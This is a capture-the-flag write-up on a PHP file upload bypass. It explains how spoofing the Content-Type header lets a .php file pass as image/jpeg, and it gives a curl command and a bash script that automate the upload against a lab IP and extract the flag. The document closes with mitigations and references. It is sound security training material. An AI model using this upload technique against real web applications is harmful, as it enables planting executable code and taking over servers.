# 🖼️ Image Upload

## 📖 Definition

A **PHP File Upload Exploit** is a type of security breach where an attacker bypasses input validation mechanisms to upload a malicious PHP file disguised as another type of file, such as an image, to a vulnerable web application. This file, when executed, can provide the attacker unauthorized control over the server or access to sensitive data.

**Key Characteristics of a PHP File Upload Exploit:**

1. **Exploitation of File Upload Functionality:** attackers target poorly secured file upload features, often by tricking the server into accepting PHP files under the guise of valid file types like images.

2. **Misconfigured MIME Type Validation:** exploits occur when the server relies solely on the file's MIME type or extension to validate its content. In this case, the attacker uses a curl command to upload the malicious PHP file, specifying a misleading MIME type (e.g., image/jpeg).

3. **Execution of Malicious Code:** once uploaded, the malicious file may be executed by accessing it through a web browser or triggering it indirectly. This allows the attacker to perform actions such as obtaining sensitive data or escalating privileges.

4. **Inadequate Input Validation:** This breach often exploits systems that fail to validate the file's contents, relying instead on extensions or MIME types, leaving the server vulnerable.

5. **Common Attack Objectives:**

	- Backdoor installation for persistent server access.
	- Arbitrary code execution.
	- Retrieving sensitive information (e.g., flags in Capture-The-Flag challenges).

## 🔍 Discovery

We go on the **File Upload** page ("ADD IMAGE" button on the Home page) and we saw that we can upload images. We saw on different documentations that weak websites aren't protected against malicious file uploads because of a flawed validation. One way that websites may attempt to validate file uploads is to check that this input-specific Content-Type header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like image/jpeg and image/png. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed. So we decide to use a `curl` command to upload a `.php` file as an image file thanks to this command:

```bash
curl -s -X POST -F "uploaded=@bug.php;type=image/jpeg" -F "Upload=Upload" "http://10.12.248.253/index.php?page=upload" | grep 'flag'
```

Then, we get the flag.

As you can see if you open the `bug.php` file, there's nothing in it. We asked ourselves why and came to the conclusion that the purpose of the flaw was only to understand its basic functionings so the file content is not primary.

## 🏁 Flag

1. Open a terminal
2. Run the script using `./script <ip>`

## 💡 Solutions

**script.sh | Usage: `./script.sh <ip>`**

```bash
#!/bin/bash

if [ "$#" -ne 1 ]; then
	echo "Usage: ./script.sh <ip>"
	exit 1
else
	ip=$1
fi

echo "Testing the IP address..."
response=$(curl -s -o /dev/null -w "%{http_code}" http://$ip)

if [ $response -eq 200 ]; then
	echo "The IP address responded successfully with HTTP status code 200."
	echo "Extracting the flag..."
	flag=$(curl -s -X POST -F "uploaded=@bug.php;type=image/jpeg" -F "Upload=Upload" "http://$ip/index.php?page=upload" |
		grep -oP '(?<=The flag is : ).*?(?=</h2>)')
	
	if [ -n "$flag" ]; then
		echo "The flag is: $flag"
	else
		echo "Failed to extract the flag."
	fi
else
	echo "Failed to connect. HTTP status code: $response"
fi
```

The script first checks if exactly one argument (the IP address) is provided; if not, it displays usage instructions and exits. After validating the input, it uses `curl` to send a GET request to test if the IP address is reachable and checks for a successful HTTP response (status code 200). If the server responds successfully, the script sends a `POST` request to upload a file (`bug.php`) as an image and looks for the flag embedded in the server's HTML response using a `grep` command with a regex. If the flag is found, it is displayed; otherwise, it reports a failure to extract the flag. If the server is unreachable, the script reports the HTTP error code.

## 🔧 Patch

Many defensive measures can be taken, but here are the main ones:

- **Validate File Contents and Types**
	- **Verify File Content:** Check the file's actual contents (e.g., by inspecting magic bytes) rather than relying on MIME type or file extensions.
	- **Restrict Allowed File Types:** Only allow specific file formats like `.jpg`, `.png`, or `.gif`. Reject files with PHP or other executable code.
- **Rename Uploaded Files**
	- Rename uploaded files to a random, non-executable name upon saving, e.g., `randomstring1234.img`. This prevents execution even if the file contains malicious code.
- **Store Files Outside the Web Root**
	- Save uploaded files in directories outside the web-accessible root (e.g., `/uploads` outside `/var/www/html`).
	- Serve the files through a proxy or use a secure method to fetch and display them.
- **Disable PHP Execution in Upload Directories**
	- Modify the web server configuration to block PHP execution in upload folders.

## 📚 References

- [File upload vulnerabilities (PortSwigger)](https://portswigger.net/web-security/file-upload)
- [Unrestricted File Upload (OWASP)](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [File Upload Cheat Sheet (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [File Upload (HackTricks)](https://book.hacktricks.xyz/pentesting-web/file-upload)